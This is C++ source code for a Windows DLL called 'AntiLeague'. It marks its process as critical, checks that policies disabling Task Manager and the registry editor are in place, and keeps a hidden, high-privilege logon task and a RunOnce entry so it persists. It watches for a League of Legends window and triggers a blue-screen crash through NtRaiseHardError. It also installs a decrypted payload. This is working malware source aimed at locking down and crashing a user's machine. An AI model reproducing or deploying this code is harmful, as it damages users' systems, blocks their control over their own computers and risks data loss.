#include "stdafx.h"
#include "Install.h"
#include "payload.h"

void BSOD()
{
    BOOLEAN pv;
    ULONG response;

    RtlAdjustPrivilege(19, TRUE, FALSE, &pv);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, NULL, NULL, NULL, 6, &response);
}

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    LUID luid;
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES), &hToken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;

    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = NULL;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        return FALSE;

    return TRUE;
}

extern "C"
{
    void DisableCritical()
    {
        RtlSetProcessIsCritical(FALSE, NULL, FALSE);
    }

    bool AntiLeague()
    {
        CoInitializeEx(NULL, COINIT_MULTITHREADED);
        CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);

        wchar_t szExeFileName[MAX_PATH];
        GetModuleFileName(NULL, szExeFileName, MAX_PATH);

        for (;;)
        {
        #ifdef DisableTaskMGR
        {
            DWORD value;
            DWORD size = sizeof(value);

            if (RegGetValue(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", RRF_RT_DWORD, nullptr, &value, &size) == ERROR_SUCCESS)
            {
                if (value == NULL)
                {
                    CoUninitialize();
                    return false;
                }
            }
            else
            {
                CoUninitialize();
                return false;
            }
        }
        #endif

        #ifdef DisableRegistry
        {
            DWORD value;
            DWORD size = sizeof(value);

            if (RegGetValue(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", RRF_RT_DWORD, nullptr, &value, &size) == ERROR_SUCCESS)
            {
                if (value == NULL)
                {
                    CoUninitialize();
                    return false;
                }
            }
            else
            {
                CoUninitialize();
                return false;
            }
        }
        #endif

        #ifdef RunOnceRegistry
        {
            wchar_t value[1024];
            DWORD size = sizeof(value);

            if (RegGetValue(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", L"*AntiLeague", RRF_RT_REG_SZ, nullptr, &value, &size) == ERROR_SUCCESS)
            {
                std::wstring path = value;
                path.erase(std::remove(path.begin(), path.end(), '\"'), path.end());

                if (wcscmp(path.c_str(), szExeFileName) != NULL)
                {
                    CoUninitialize();
                    return false;
                }
            }
            else
            {
                CoUninitialize();
                return false;
            }
        }
        #endif

        #ifdef TaskSchedulerStartup
            try
            {
                ITaskService* pService = NULL;
                CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);

                pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

                ITaskFolder* pRootFolder = NULL;
                pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);

                IRegisteredTask* pRegisteredTask = NULL;
                pRootFolder->GetTask(_bstr_t(L"AntiLeague"), &pRegisteredTask);
                pRootFolder->Release();

                VARIANT_BOOL pEnabled;
                pRegisteredTask->get_Enabled(&pEnabled);

                if (!pEnabled)
                {
                    pRegisteredTask->Release();
                    pService->Release();
                    CoUninitialize();

                    return false;
                }

                ITaskDefinition* pTask = NULL;
                pRegisteredTask->get_Definition(&pTask);
                pRegisteredTask->Release();
                pService->Release();

                ITaskSettings* pSettings = NULL;
                pTask->get_Settings(&pSettings);

                VARIANT_BOOL pDisallowStart;
                pSettings->get_DisallowStartIfOnBatteries(&pDisallowStart);

                if (pDisallowStart)
                {
                    pSettings->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                VARIANT_BOOL pStopIfOnBatteries;
                pSettings->get_StopIfGoingOnBatteries(&pStopIfOnBatteries);

                if (pStopIfOnBatteries)
                {
                    pSettings->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                BSTR pExecutionTimeLimit;
                pSettings->get_ExecutionTimeLimit(&pExecutionTimeLimit);

                if (wcscmp(pExecutionTimeLimit, L"PT0S") != NULL)
                {
                    pSettings->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                VARIANT_BOOL pHidden;
                pSettings->get_Hidden(&pHidden);

                if (!pHidden)
                {
                    pSettings->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                VARIANT_BOOL pAllowHardTerminate;
                pSettings->get_AllowHardTerminate(&pAllowHardTerminate);

                if (pAllowHardTerminate)
                {
                    pSettings->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                VARIANT_BOOL pRunOnlyIfIdle;
                pSettings->get_RunOnlyIfIdle(&pRunOnlyIfIdle);

                if (pRunOnlyIfIdle)
                {
                    pSettings->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                VARIANT_BOOL pRunOnlyIfNetworkAvailable;
                pSettings->get_RunOnlyIfNetworkAvailable(&pRunOnlyIfNetworkAvailable);

                if (pRunOnlyIfNetworkAvailable)
                {
                    pSettings->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                pSettings->Release();

                ITriggerCollection* pTriggerCollection = NULL;
                pTask->get_Triggers(&pTriggerCollection);

                ITrigger* pTrigger = NULL;
                pTriggerCollection->get_Item(1, &pTrigger);
                pTriggerCollection->Release();

                TASK_TRIGGER_TYPE2 pTriggerType;
                pTrigger->get_Type(&pTriggerType);

                if (pTriggerType != TASK_TRIGGER_LOGON)
                {
                    pTrigger->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                VARIANT_BOOL pTriggerEnabled;
                pTrigger->get_Enabled(&pTriggerEnabled);

                if (!pTriggerEnabled)
                {
                    pTrigger->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                BSTR pTriggerExecutionTimeLimit;
                pTrigger->get_ExecutionTimeLimit(&pTriggerExecutionTimeLimit);

                if (pTriggerExecutionTimeLimit != NULL)
                {
                    pTrigger->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                BSTR pStart;
                pTrigger->get_StartBoundary(&pStart);

                if (pStart != NULL)
                {
                    pTrigger->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                BSTR pEnd;
                pTrigger->get_EndBoundary(&pEnd);

                if (pEnd != NULL)
                {
                    pTrigger->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                ILogonTrigger* pLogonTrigger = NULL;
                pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
                pTrigger->Release();

                BSTR pDelay;
                pLogonTrigger->get_Delay(&pDelay);

                if (pDelay != NULL)
                {
                    pLogonTrigger->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                BSTR pUser;
                pLogonTrigger->get_UserId(&pUser);

                if (pUser != NULL)
                {
                    pLogonTrigger->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                pLogonTrigger->Release();

                IPrincipal* pPrincipal;
                pTask->get_Principal(&pPrincipal);

                TASK_RUNLEVEL_TYPE pRunLevel;
                pPrincipal->get_RunLevel(&pRunLevel);

                if (pRunLevel != TASK_RUNLEVEL_HIGHEST)
                {
                    pPrincipal->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                TASK_LOGON_TYPE pType;
                pPrincipal->get_LogonType(&pType);

                if (pType != TASK_LOGON_GROUP)
                {
                    pPrincipal->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                BSTR pGroup;
                pPrincipal->get_GroupId(&pGroup);

                if (wcscmp(pGroup, L"Administrators") != NULL)
                {
                    pPrincipal->Release();
                    pTask->Release();
                    CoUninitialize();

                    return false;
                }

                pPrincipal->Release();

                IActionCollection* pActionCollection = NULL;
                pTask->get_Actions(&pActionCollection);
                pTask->Release();

                IAction* pAction = NULL;
                pActionCollection->get_Item(1, &pAction);
                pActionCollection->Release();

                TASK_ACTION_TYPE pActionType;
                pAction->get_Type(&pActionType);

                if (pActionType != TASK_ACTION_EXEC)
                {
                    pAction->Release();
                    CoUninitialize();

                    return false;
                }

                IExecAction* pExecAction = NULL;
                pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                pAction->Release();

                BSTR pPath;
                pExecAction->get_Path(&pPath);

                std::wstring wPath = pPath;
                wPath.erase(std::remove(wPath.begin(), wPath.end(), '\"'), wPath.end());

                if (wcscmp(wPath.c_str(), szExeFileName) != NULL)
                {
                    pExecAction->Release();
                    CoUninitialize();

                    return false;
                }

                BSTR pArgument;
                pExecAction->get_Arguments(&pArgument);

                if (pArgument != NULL)
                {
                    pExecAction->Release();
                    CoUninitialize();

                    return false;
                }

                BSTR pWorkingDirectory;
                pExecAction->get_WorkingDirectory(&pWorkingDirectory);

                if (pWorkingDirectory != NULL)
                {
                    pExecAction->Release();
                    CoUninitialize();

                    return false;
                }

                pExecAction->Release();
            }
            catch (...)
            {
                CoUninitialize();
                return false;
            }
        #endif

            if (FindWindow(NULL, L"League of Legends") != NULL)
            {
                CoUninitialize();
                BSOD();

                exit(0);
            }

            Sleep(1000);
            continue;
        }

        /*
            Unreachable
        */

        CoUninitialize();
        return true;
    }

    void Init(const std::string& payloadPath, const std::string& payload, const std::string& dec_key)
    {
        wchar_t desktop[MAX_PATH];
        SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, SHGFP_TYPE_CURRENT, desktop);

        if (desktop[0] == NULL)
        {
            BSOD();
            exit(1);
        }

        std::wstring uninstall = desktop;
        uninstall += L"\\";
        uninstall += uninstallCode;

        if (_waccess_s(uninstall.c_str(), 0) == 0)
        {
            switch (MessageBox(NULL, L"Are you sure you want to remove AntiLeague?", L"Uninstaller", MB_YESNO))
            {
            case IDYES:
                Installer::Uninstall();
                wchar_t szExeFileName[MAX_PATH];
                GetModuleFileName(NULL, szExeFileName, MAX_PATH);

                MoveFileEx(szExeFileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
                MoveFileExA(payloadPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
                _wunlink(uninstall.c_str());

                MessageBox(NULL, L"AntiLeague has been successfully uninstalled.", L"Uninstaller", MB_OK);
                MessageBox(NULL, L"Your PC will now restart to delete all files associated with this AntiLeague install.", L"Uninstaller", MB_OK);

                SetPrivilege(L"SeShutdownPrivilege", TRUE);
                ExitWindowsEx(EWX_REBOOT | EWX_FORCEIFHUNG, SHTDN_REASON_MAJOR_APPLICATION | SHTDN_REASON_MINOR_INSTALLATION | SHTDN_REASON_FLAG_PLANNED);

                exit(0);
                break;

            case IDNO:
                MessageBox(NULL, L"Thank you for staying!", L"AntiLeague", NULL);
                break;
            }
        }

        SetPrivilege(L"SeDebugPrivilege", TRUE);
        RtlSetProcessIsCritical(TRUE, NULL, FALSE);

        Installer Installer(payload, dec_key);
        Installer.Install();
        isFirstInstance = true;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    return TRUE;
}